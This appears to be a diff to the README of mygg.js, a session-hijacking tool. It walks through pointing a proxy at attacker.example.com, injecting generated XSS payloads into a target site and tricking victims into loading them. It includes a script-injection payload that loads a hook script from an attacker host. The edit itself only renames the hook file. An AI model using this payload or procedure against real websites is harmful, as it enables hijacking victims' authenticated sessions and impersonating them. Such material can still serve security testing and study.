@@ -12,7 +12,7 @@ mygg.js (Norwegian for mosquito) is a tool designed to hijack a victim's session
 4. **Configure the Attacker's Browser**: Open a browser and set the proxy to `http://attacker.example.com:8081`.
 5. **Generate Payloads**: Run the mygg.js application, which will print various payloads in the console. These payloads can be used for different XSS vectors.
 6. **Inject Payload**: Inject one of the payloads into the XSS injection point on the target website and trick the victim into loading it.
-7. **Victim Gets Hooked**: Once the victim loads the payload, their browser will be hooked and load the hook.js script.
+7. **Victim Gets Hooked**: Once the victim loads the payload, their browser will be hooked.
 8. **Monitor and Interact**: The attacker must browse to the target website through the proxy. Once the victim is hooked, the attacker can interact with the target website as though they are authenticated as the victim.
 
 ## Prerequisites
@@ -51,7 +51,7 @@ When mygg.js is started, it will output various XSS payloads you may inject. Exa
 ```html
 <script>
   var x=document.createElement('script');
-  x.src='//attacker.example.com:8443/hook.js';
+  x.src='//attacker.example.com:8443/mygg.js';
   document.head.appendChild(x);
 </script>
 ```
